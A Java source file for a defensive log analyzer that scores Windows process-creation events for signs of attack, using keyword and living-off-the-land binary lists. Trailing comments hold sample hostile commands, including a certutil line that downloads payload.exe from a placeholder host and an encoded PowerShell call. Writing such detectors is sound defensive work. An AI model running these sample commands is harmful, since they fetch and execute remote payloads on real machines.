package monitoring1;

import logging.LogParser;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.swing.*;
import java.io.File;
import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

public class ProcessCreationAnalyzer {

    private static final Set<String> WHITELISTED_PROCESSES = new HashSet<>(Arrays.asList(
            "explorer.exe", "services.exe", "lsass.exe", "wininit.exe", "csrss.exe"
    ));

    public static void analyzeProcessCreationEvents(String xmlLogFile, String outputJsonFile, JTextArea outputArea) {
        try {
            // Step 1: Parse XML log to JSON
            new LogParser().parseSecurityLogs(xmlLogFile, "logs/suspicious_event_log.json");

            // Step 2: Load and analyze JSON data
            String content = new String(Files.readAllBytes(Paths.get("logs/suspicious_event_log.json"))).trim();
            JSONArray events = new JSONArray(content);
            JSONArray suspiciousEvents = new JSONArray();

            int totalEvents = 0;
            int flaggedEvents = 0;

            for (int i = 0; i < events.length(); i++) {
                JSONObject event = events.getJSONObject(i);
                if (!"4688".equals(event.optString("EventID"))) continue;
                totalEvents++;

                JSONObject eventData = event.optJSONObject("EventData");
                if (eventData == null) continue;

                String newProcessName = eventData.optString("NewProcessName", "").toLowerCase();
                String parentProcessName = eventData.optString("ParentProcessName", "").toLowerCase();
                String commandLine = eventData.optString("CommandLine", "").toLowerCase();

                if (WHITELISTED_PROCESSES.contains(newProcessName)) continue;

                int riskScore = 0;
                List<String> reasons = new ArrayList<>();

                if (parentProcessName.contains("explorer.exe") && newProcessName.contains("powershell.exe") && commandLine.contains("-enc")) {
                    riskScore += 3;
                    reasons.add("Powershell encoded command launched by explorer.exe");
                }

                if (commandLine.contains("invoke-expression") || commandLine.contains("base64")) {
                    riskScore += 2;
                    reasons.add("Command line contains suspicious keywords");
                }

                String[] lolBins = {"certutil.exe", "mshta.exe", "wmic.exe", "rundll32.exe", "regsvr32.exe"};
                for (String bin : lolBins) {
                    if (newProcessName.contains(bin)) {
                        riskScore += 2;
                        reasons.add("Known LOLBin executed: " + bin);
                        break;
                    }
                }

                if (newProcessName.endsWith(".js") || newProcessName.endsWith(".vbs") || newProcessName.endsWith(".wsf")) {
                    riskScore += 2;
                    reasons.add("Scripting file executed: " + newProcessName);
                }

                if (commandLine.matches(".*\\.ps1.*") || commandLine.matches(".*\\.bat.*")) {
                    riskScore += 1;
                    reasons.add("Batch or PowerShell script invoked");
                }

                if ((newProcessName.contains("cmd.exe") || newProcessName.contains("powershell.exe")) && commandLine.contains("/c")) {
                    riskScore += 1;
                    reasons.add("Command execution using cmd or PowerShell /c");
                }

                if (!WHITELISTED_PROCESSES.contains(parentProcessName)) {
                    riskScore += 1;
                    reasons.add("Unusual parent process: " + parentProcessName);
                }

                if (riskScore >= 3) {
                    JSONObject suspiciousEvent = new JSONObject();
                    suspiciousEvent.put("newProcessName", newProcessName);
                    suspiciousEvent.put("parentProcessName", parentProcessName);
                    suspiciousEvent.put("commandLine", commandLine);
                    suspiciousEvent.put("riskScore", riskScore);
                    suspiciousEvent.put("reasons", reasons);
                    suspiciousEvents.put(suspiciousEvent);

                    StringBuilder logEntry = new StringBuilder();
                    logEntry.append("[SUSPICIOUS] ").append(newProcessName)
                            .append(" launched by ").append(parentProcessName)
                            .append("\nReasons: ").append(String.join(", ", reasons))
                            .append("\nRisk Score: ").append(riskScore).append("\n\n");

                    if (outputArea != null) outputArea.append(logEntry.toString());
                    flaggedEvents++;
                }
            }

            if (outputArea != null) {
                outputArea.append("\n[INFO] Process scan complete. Total events: " + totalEvents + ", Suspicious: " + flaggedEvents + "\n");
                if (flaggedEvents == 0) outputArea.append("[INFO] No suspicious processes detected.\n");
            }

            // Save JSON
            File file = new File(outputJsonFile);
            file.getParentFile().mkdirs();
            try (FileWriter writer = new FileWriter(file)) {
                writer.write(suspiciousEvents.toString(2));
                System.out.println("[INFO] Suspicious process creation events saved to " + outputJsonFile);
            }

        } catch (Exception e) {
            e.printStackTrace();
            if (outputArea != null) outputArea.append("[ERROR] Exception: " + e.getMessage() + "\n");
        }
    }

    public static List<String> getUsbExecutedProcesses(String suspiciousJsonPath) {
        List<String> usbProcesses = new ArrayList<>();
        try {
            String content = new String(Files.readAllBytes(Paths.get(suspiciousJsonPath))).trim();
            JSONArray suspiciousProcesses = new JSONArray(content);
            for (int i = 0; i < suspiciousProcesses.length(); i++) {
                JSONObject process = suspiciousProcesses.getJSONObject(i);
                String cmd = process.optString("commandLine", "").toLowerCase();
                String name = process.optString("newProcessName", "(unknown)");
                if (cmd.startsWith("e:\\") || cmd.contains("/media/usb") || cmd.contains("f:\\") || cmd.contains("g:\\")) {
                    usbProcesses.add(name + " | CommandLine: " + cmd);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return usbProcesses;
    }
}

//powershell -enc SQBFAFgA
//rundll32.exe dummy.dll,EntryPoint
//certutil.exe -urlcache -split -f http://example.com/payload.exe payload.exe

